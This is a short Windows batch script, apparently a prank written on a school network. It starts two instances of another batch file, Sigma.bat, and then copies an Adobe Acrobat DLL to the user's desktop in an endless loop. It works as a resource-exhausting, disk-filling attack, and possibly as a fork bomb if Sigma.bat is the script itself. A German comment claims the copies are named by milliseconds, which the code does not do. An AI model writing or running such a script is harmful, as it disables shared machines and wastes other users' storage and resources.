@echo off
set "sourceFile=C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.dll"
set "destination=H:\Desktop"
set /a counter=1
start "" "G:\Cla.if21\Benjamin Kuhnert\Sigma.bat"
start "" "G:\Cla.if21\Benjamin Kuhnert\Sigma.bat"
:loop


set /a counter=%counter%+1
:: Kopieren mit Millisekunden im Namen
copy "%sourceFile%" "%destination%\Kopie_Nr_%counter%.dll"



goto loop